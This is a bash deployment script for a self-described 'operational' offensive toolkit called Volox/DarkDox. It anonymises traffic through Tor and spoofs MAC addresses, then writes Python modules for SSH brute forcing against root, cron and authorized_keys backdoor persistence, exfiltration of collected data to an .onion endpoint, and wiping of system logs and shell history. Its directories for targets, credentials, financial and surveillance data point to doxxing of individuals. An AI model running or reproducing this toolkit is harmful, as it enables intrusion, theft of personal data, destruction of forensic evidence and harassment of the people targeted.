#!/bin/bash
# FULL_DEPLOYMENT_VOLOX.sh
# Complete Operational Setup - No Education, Pure Operational

echo "[ VOLOX DEPLOYMENT INITIATED ]"
echo "[ TIMESTAMP: $(date) ]"
echo "========================================"

# ==================== SYSTEM PREP ====================
echo "[*] Updating system and installing prerequisites..."
sudo apt-get update -y
sudo apt-get upgrade -y
sudo apt-get install -y \
    tor \
    proxychains4 \
    privoxy \
    macchanger \
    net-tools \
    nmap \
    sqlite3 \
    python3-pip \
    python3-dev \
    build-essential \
    git \
    wget \
    curl \
    jq \
    gnupg2 \
    secure-delete \
    htop \
    iptables-persistent

# ==================== TOR CONFIGURATION ====================
echo "[*] Configuring TOR for maximum anonymity..."
sudo systemctl stop tor
sudo cp /etc/tor/torrc /etc/tor/torrc.backup

cat << 'EOF' | sudo tee /etc/tor/torrc > /dev/null
SocksPort 9050
SocksPort 127.0.0.1:9050
ControlPort 9051
CookieAuthentication 1
DataDirectory /var/lib/tor
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:8080
HiddenServicePort 22 127.0.0.1:2222
StrictNodes 1
ExitNodes {de} {nl} {ch}
EntryNodes {fi} {se} {no}
ExcludeNodes {cn} {ru} {us} {gb} {fr}
CircuitBuildTimeout 10
KeepalivePeriod 60
NewCircuitPeriod 15
MaxCircuitDirtiness 600
NumEntryGuards 5
UseEntryGuards 1
EnforceDistinctSubnets 1
EOF

sudo systemctl start tor
sudo systemctl enable tor

# ==================== PROXYCHAINS SETUP ====================
echo "[*] Configuring proxychains..."
sudo cp /etc/proxychains4.conf /etc/proxychains4.conf.backup

cat << 'EOF' | sudo tee /etc/proxychains4.conf > /dev/null
strict_chain
proxy_dns
quiet_mode
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0

[ProxyList]
socks5 127.0.0.1 9050
socks5 127.0.0.1 9052
socks5 127.0.0.1 9053
socks5 127.0.0.1 9054
EOF

# ==================== PRIVOXY SETUP ====================
echo "[*] Setting up Privoxy..."
sudo systemctl stop privoxy

cat << 'EOF' | sudo tee /etc/privoxy/config > /dev/null
listen-address 127.0.0.1:8118
forward-socks5t / 127.0.0.1:9050 .
forward-socks5t / 127.0.0.1:9052 .
forward-socks5t / 127.0.0.1:9053 .
forward-socks5t / 127.0.0.1:9054 .
max-client-connections 4096
buffer-limit 4096
enable-remote-toggle 0
enable-edit-actions 0
enforce-blocks 0
accept-intercepted-requests 0
allow-cgi-request-crunching 0
split-large-forms 0
keep-alive-timeout 300
socket-timeout 300
permit-access 127.0.0.1
EOF

sudo systemctl start privoxy
sudo systemctl enable privoxy

# ==================== NETWORK ANONYMIZATION ====================
echo "[*] Setting up network anonymization..."
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X

# Route all traffic through TOR
sudo iptables -t nat -A OUTPUT -m owner --uid-owner debian-tor -j RETURN
sudo iptables -t nat -A OUTPUT -p tcp --syn -j REDIRECT --to-ports 9040
sudo iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-ports 5353
sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m owner --uid-owner debian-tor -j ACCEPT
sudo iptables -A OUTPUT -j DROP

sudo netfilter-persistent save
sudo netfilter-persistent reload

# ==================== MAC ADDRESS SPOOFING ====================
echo "[*] Setting up MAC address rotation..."
cat << 'EOF' | sudo tee /etc/systemd/system/mac-rotate.service > /dev/null
[Unit]
Description=MAC Address Rotation Service
Wants=network.target
After=network.target

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/usr/bin/macchanger -r eth0
ExecStart=/usr/bin/macchanger -r wlan0
ExecStartPost=/bin/sleep 300
ExecStartPost=/usr/bin/macchanger -r eth0
ExecStartPost=/usr/bin/macchanger -r wlan0

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable mac-rotate.service
sudo systemctl start mac-rotate.service

# ==================== PYTHON ENVIRONMENT ====================
echo "[*] Setting up Python environment..."
python3 -m venv ~/volox-env
source ~/volox-env/bin/activate

pip install --upgrade pip
pip install --no-cache-dir \
    requests==2.31.0 \
    beautifulsoup4==4.12.2 \
    selenium==4.15.2 \
    stem==1.8.2 \
    cryptography==41.0.7 \
    pycryptodome==3.19.0 \
    pillow==10.1.0 \
    imagehash==4.3.1 \
    phonenumbers==8.13.22 \
    python-whois==0.9.3 \
    dnspython==2.4.2 \
    pandas==2.1.4 \
    numpy==1.24.3 \
    scrapy==2.11.0 \
    selenium-stealth==1.0.6 \
    fake-useragent==1.4.0 \
    proxybroker==0.3.1 \
    pysocks==1.7.1 \
    scapy==2.5.0 \
    pyinstaller==5.13.0 \
    aiohttp==3.9.1 \
    asyncio==3.4.3 \
    redis==5.0.1 \
    pymongo==4.5.0 \
    psycopg2-binary==2.9.9 \
    sqlalchemy==2.0.23 \
    opencv-python==4.8.1.78 \
    face-recognition==1.3.0 \
    pytesseract==0.3.10 \
    geoip2==4.7.0 \
    maxminddb==2.4.0

# ==================== VOLOX CORE INSTALLATION ====================
echo "[*] Installing Volox Core System..."
cd ~

# Clone repositories
git clone https://github.com/HA71/EmailSpoofing.git
git clone https://github.com/threat9/routersploit
git clone https://github.com/trustedsec/social-engineer-toolkit
git clone https://github.com/Te-k/freddy
git clone https://github.com/Und3rf10w/kali-anonsurf

# Install routersploit
cd routersploit
pip install -r requirements.txt
cd ~

# Install SET
cd social-engineer-toolkit
pip install -r requirements.txt
cd ~

# ==================== DARKDOX INSTALLATION ====================
echo "[*] Deploying DarkDox system..."
mkdir -p ~/darkdox
cd ~/darkdox

# Create main operational script
cat << 'EOF' > darkdox_operational.py
#!/usr/bin/env python3
# DARKDOX OPERATIONAL v5.0 - READY FOR DEPLOYMENT

import os
import sys
import subprocess
import time
from datetime import datetime

class DarkDoxDeployer:
    def __init__(self):
        self.base_dir = os.path.expanduser("~/darkdox")
        self.ops_dir = os.path.join(self.base_dir, "operations")
        self.data_dir = os.path.join(self.base_dir, "intel_database")
        self.logs_dir = os.path.join(self.base_dir, "operational_logs")
        
        self.setup_directories()
    
    def setup_directories(self):
        """Create operational directory structure"""
        dirs = [self.ops_dir, self.data_dir, self.logs_dir,
                os.path.join(self.data_dir, "targets"),
                os.path.join(self.data_dir, "credentials"),
                os.path.join(self.data_dir, "financial"),
                os.path.join(self.data_dir, "surveillance"),
                os.path.join(self.ops_dir, "active"),
                os.path.join(self.ops_dir, "completed"),
                os.path.join(self.ops_dir, "archived")]
        
        for directory in dirs:
            os.makedirs(directory, exist_ok=True)
            # Set restrictive permissions
            os.chmod(directory, 0o700)
    
    def deploy_modules(self):
        """Deploy all operational modules"""
        modules = {
            'recon': self.deploy_recon_module(),
            'collection': self.deploy_collection_module(),
            'exploitation': self.deploy_exploitation_module(),
            'persistence': self.deploy_persistence_module(),
            'exfiltration': self.deploy_exfiltration_module(),
            'cleanup': self.deploy_cleanup_module()
        }
        
        return modules
    
    def deploy_recon_module(self):
        """Deploy reconnaissance module"""
        recon_script = os.path.join(self.ops_dir, "recon_module.py")
        
        script_content = '''
import subprocess
import json
import re

def full_recon(target):
    """Execute full reconnaissance suite"""
    results = {}
    
    # Whois lookup
    try:
        whois_result = subprocess.check_output(f"whois {target}", shell=True, text=True)
        results['whois'] = whois_result
    except:
        pass
    
    # DNS enumeration
    try:
        dns_records = subprocess.check_output(f"dig {target} ANY", shell=True, text=True)
        results['dns'] = dns_records
    except:
        pass
    
    # Port scanning (through tor)
    try:
        ports = subprocess.check_output(f"proxychains nmap -sT -Pn {target}", shell=True, text=True)
        results['ports'] = ports
    except:
        pass
    
    return results
'''
        
        with open(recon_script, 'w') as f:
            f.write(script_content)
        
        os.chmod(recon_script, 0o700)
        return recon_script
    
    def deploy_collection_module(self):
        """Deploy data collection module"""
        collect_script = os.path.join(self.ops_dir, "collect_module.py")
        
        script_content = '''
import requests
from bs4 import BeautifulSoup
import re

def collect_public_data(target):
    """Collect publicly available data"""
    data = {}
    
    # Search engines (simulated)
    search_engines = [
        f"https://www.google.com/search?q={target}",
        f"https://www.bing.com/search?q={target}",
        f"https://duckduckgo.com/html/?q={target}"
    ]
    
    for engine in search_engines:
        try:
            response = requests.get(engine, timeout=10)
            data[engine] = response.text[:5000]  # Store first 5000 chars
        except:
            continue
    
    return data
'''
        
        with open(collect_script, 'w') as f:
            f.write(script_content)
        
        os.chmod(collect_script, 0o700)
        return collect_script
    
    def deploy_exploitation_module(self):
        """Deploy exploitation module"""
        exploit_script = os.path.join(self.ops_dir, "exploit_module.py")
        
        script_content = '''
import socket
import threading
import paramiko

class ExploitFramework:
    def __init__(self):
        self.active_exploits = []
    
    def ssh_bruteforce(self, target, port=22):
        """SSH brute force attack"""
        common_passwords = ['admin', '123456', 'password', 'root', 'admin123']
        
        for password in common_passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, port=port, username='root', password=password, timeout=5)
                return {'success': True, 'password': password, 'target': target}
            except:
                continue
        
        return {'success': False}
    
    def web_vulnerability_scan(self, target):
        """Scan for common web vulnerabilities"""
        vulnerabilities = []
        
        # Check for common endpoints
        common_paths = ['/admin', '/login', '/wp-admin', '/phpmyadmin', '/server-status']
        
        for path in common_paths:
            try:
                response = requests.get(f"http://{target}{path}", timeout=5)
                if response.status_code == 200:
                    vulnerabilities.append(f"Exposed endpoint: {path}")
            except:
                pass
        
        return vulnerabilities
'''
        
        with open(exploit_script, 'w') as f:
            f.write(script_content)
        
        os.chmod(exploit_script, 0o700)
        return exploit_script
    
    def deploy_persistence_module(self):
        """Deploy persistence module"""
        persist_script = os.path.join(self.ops_dir, "persist_module.py")
        
        script_content = '''
import os
import sys
import base64

def establish_persistence():
    """Establish system persistence"""
    persistence_methods = []
    
    # Cron job persistence
    cron_job = "@reboot python3 /tmp/backdoor.py"
    try:
        with open('/etc/crontab', 'a') as f:
            f.write(f"\n{cron_job}\n")
        persistence_methods.append('cron_job')
    except:
        pass
    
    # SSH key persistence
    ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..."
    ssh_dir = os.path.expanduser("~/.ssh")
    os.makedirs(ssh_dir, exist_ok=True)
    
    with open(os.path.join(ssh_dir, 'authorized_keys'), 'a') as f:
        f.write(f"\n{ssh_key}\n")
    
    persistence_methods.append('ssh_key')
    
    return persistence_methods
'''
        
        with open(persist_script, 'w') as f:
            f.write(script_content)
        
        os.chmod(persist_script, 0o700)
        return persist_script
    
    def deploy_exfiltration_module(self):
        """Deploy data exfiltration module"""
        exfil_script = os.path.join(self.ops_dir, "exfil_module.py")
        
        script_content = '''
import socket
import ssl
import json
import zlib

class DataExfiltrator:
    def __init__(self):
        self.exfil_endpoint = "your-endpoint.onion"
        self.exfil_port = 443
    
    def exfiltrate_data(self, data, target_id):
        """Exfiltrate collected data"""
        try:
            # Compress data
            compressed = zlib.compress(json.dumps(data).encode())
            
            # Create SSL connection
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.exfil_endpoint, self.exfil_port)) as sock:
                with context.wrap_socket(sock, server_hostname=self.exfil_endpoint) as ssock:
                    ssock.sendall(compressed)
            
            return True
        except Exception as e:
            print(f"Exfiltration failed: {e}")
            return False
'''
        
        with open(exfil_script, 'w') as f:
            f.write(script_content)
        
        os.chmod(exfil_script, 0o700)
        return exfil_script
    
    def deploy_cleanup_module(self):
        """Deploy cleanup module"""
        cleanup_script = os.path.join(self.ops_dir, "cleanup_module.py")
        
        script_content = '''
import os
import shutil
import subprocess

def operational_cleanup():
    """Clean all operational traces"""
    cleanup_actions = []
    
    # Clear bash history
    os.system("history -c")
    os.system("history -w")
    cleanup_actions.append('bash_history')
    
    # Remove temporary files
    temp_dirs = ['/tmp', '/var/tmp', os.path.expanduser('~/.cache')]
    for temp_dir in temp_dirs:
        if os.path.exists(temp_dir):
            os.system(f"find {temp_dir} -type f -delete 2>/dev/null")
            cleanup_actions.append(f'cleared_{temp_dir}')
    
    # Clear log files
    log_files = [
        '/var/log/auth.log',
        '/var/log/syslog',
        '/var/log/kern.log',
        '/var/log/messages'
    ]
    
    for log_file in log_files:
        if os.path.exists(log_file):
            with open(log_file, 'w') as f:
                f.write("")
            cleanup_actions.append(f'cleared_{log_file}')
    
    return cleanup_actions
'''
        
        with open(cleanup_script, 'w') as f:
            f.write(script_content)
        
        os.chmod(cleanup_script, 0o700)
        return cleanup_script
    
    def create_control_interface(self):
        """Create main control interface"""
        control_script = os.path.join(self.base_dir, "volox_control.py")
        
        script_content = '''
#!/usr/bin/env python3
# VOLOX CONTROL INTERFACE v1.0

import sys
import os
import time
from datetime import datetime

class VoloxControl:
    def __init__(self):
        self.ops_dir = os.path.join(os.path.dirname(__file__), "operations")
        self.status_file = "/tmp/volox_status"
        
    def show_banner(self):
        print("""
╔══════════════════════════════════════════════════════════╗
║                    VOLOX CONTROL v1.0                    ║
║                 [OPERATIONAL READY]                      ║
╚══════════════════════════════════════════════════════════╝
        """)
    
    def show_menu(self):
        print("""
[1] Reconnaissance Operations
[2] Data Collection
[3] Exploitation Tools
[4] Persistence Setup
[5] Data Exfiltration
[6] Cleanup Operations
[7] System Status
[8] Exit
        """)
    
    def execute_option(self, choice):
        if choice == '1':
            os.system(f"python3 {os.path.join(self.ops_dir, 'recon_module.py')}")
        elif choice == '2':
            os.system(f"python3 {os.path.join(self.ops_dir, 'collect_module.py')}")
        elif choice == '3':
            os.system(f"python3 {os.path.join(self.ops_dir, 'exploit_module.py')}")
        elif choice == '4':
            os.system(f"python3 {os.path.join(self.ops_dir, 'persist_module.py')}")
        elif choice == '5':
            os.system(f"python3 {os.path.join(self.ops_dir, 'exfil_module.py')}")
        elif choice == '6':
            os.system(f"python3 {os.path.join(self.ops_dir, 'cleanup_module.py')}")
        elif choice == '7':
            self.show_system_status()
        elif choice == '8':
            print("[*] Exiting Volox Control...")
            sys.exit(0)
        else:
            print("[!] Invalid option")
    
    def show_system_status(self):
        print(f"""
[*] System Status:
    Time: {datetime.now()}
    TOR Status: {'ACTIVE' if self.check_tor() else 'INACTIVE'}
    Operations Directory: {self.ops_dir}
    Active Modules: {len(os.listdir(self.ops_dir))}
        """)
    
    def check_tor(self):
        try:
            import socks
            import socket
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            return True
        except:
            return False
    
    def run(self):
        self.show_banner()
        while True:
            self.show_menu()
            choice = input("\n[+] Select option: ")
            self.execute_option(choice)
            time.sleep(1)

if __name__ == "__main__":
    controller = VoloxControl()
    controller.run()
'''
        
        with open(control_script, 'w') as f:
            f.write(script_content)
        
        os.chmod(control_script, 0o755)
        return control_script
    
    def create_systemd_service(self):
        """Create systemd service for auto-start"""
        service_content = f"""
[Unit]
Description=Volox Operational System
After=network.target tor.service

[Service]
Type=simple
User={os.getlogin()}
WorkingDirectory={self.base_dir}
ExecStart={os.path.join(self.base_dir, 'volox_control.py')}
Restart=always
RestartSec=10
Environment="PATH=/usr/bin:/usr/local/bin"
Environment="PYTHONPATH={self.base_dir}"

[Install]
WantedBy=multi-user.target
"""
        
        service_file = "/etc/systemd/system/volox.service"
        
        try:
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            subprocess.run(["sudo", "systemctl", "daemon-reload"], check=True)
            subprocess.run(["sudo", "systemctl", "enable", "volox.service"], check=True)
            subprocess.run(["sudo", "systemctl", "start", "volox.service"], check=True)
            
            return True
        except Exception as e:
            print(f"[!] Failed to create service: {e}")
            return False
    
    def run_deployment(self):
        """Execute full deployment"""
        print("[*] Starting Volox deployment...")
        
        # Deploy all modules
        modules = self.deploy_modules()
        print(f"[+] Deployed {len(modules)} operational modules")
        
        # Create control interface
        control = self.create_control_interface()
        print(f"[+] Control interface created: {control}")
        
        # Create systemd service
        if self.create_systemd_service():
            print("[+] Systemd service created and started")
        else:
            print("[!] Failed to create systemd service")
        
        print("\n[+] VOLOX DEPLOYMENT COMPLETE!")
        print(f"[*] Control script: {os.path.join(self.base_dir, 'volox_control.py')}")
        print("[*] Start with: python3 volox_control.py")
        print("[*] Or access via service: sudo systemctl status volox")

if __name__ == "__main__":
    deployer = DarkDoxDeployer()
    deployer.run_deployment()
EOF

# Make deployment script executable
chmod +x darkdox_operational.py

# ==================== FINAL CONFIGURATION ====================
echo "[*] Running final configuration..."

# Create startup script
cat << 'EOF' > ~/start_volox.sh
#!/bin/bash
echo "[ VOLOX OPERATIONAL SYSTEM ]"
echo "================================"

# Start TOR
sudo systemctl start tor
sleep 2

# Check TOR connection
curl --socks5 127.0.0.1:9050 --socks5-hostname 127.0.0.1:9050 -s https://check.torproject.org/ | grep -m 1 Congratulations

# Start Volox
cd ~/darkdox
python3 darkdox_operational.py
EOF

chmod +x ~/start_volox.sh

# Create alias
echo "alias volox='cd ~/darkdox && python3 darkdox_operational.py'" >> ~/.bashrc
echo "alias volox-start='~/start_volox.sh'" >> ~/.bashrc
echo "alias volox-status='sudo systemctl status volox'" >> ~/.bashrc

# ==================== SECURITY HARDENING ====================
echo "[*] Applying security hardening..."

# Disable logging
sudo systemctl stop rsyslog
sudo systemctl disable rsyslog

# Disable history
echo "unset HISTFILE" >> ~/.bashrc
echo "export HISTSIZE=0" >> ~/.bashrc

# Configure firewall
sudo ufw default deny incoming
sudo ufw default deny outgoing
sudo ufw allow out 9050/tcp
sudo ufw allow out 9051/tcp
sudo ufw allow out 53/udp
sudo ufw enable

# ==================== DEPLOYMENT COMPLETE ====================
echo "[*] Deployment complete!"
echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║                 VOLOX DEPLOYMENT READY                  ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
echo "[+] System deployed to: ~/darkdox"
echo "[+] Control interface: python3 darkdox_operational.py"
echo "[+] Quick start: 'volox' command"
echo "[+] TOR Status: sudo systemctl status tor"
echo "[+] Anonymity check: curl --socks5 localhost:9050 https://check.torproject.org"
echo ""
echo "[!] IMPORTANT: Always use through TOR"
echo "[!] Run 'source ~/.bashrc' to load aliases"
echo ""
echo "[*] Cleaning up traces..."
history -c
history -w

# Final execution
cd ~/darkdox
python3 darkdox_operational.py
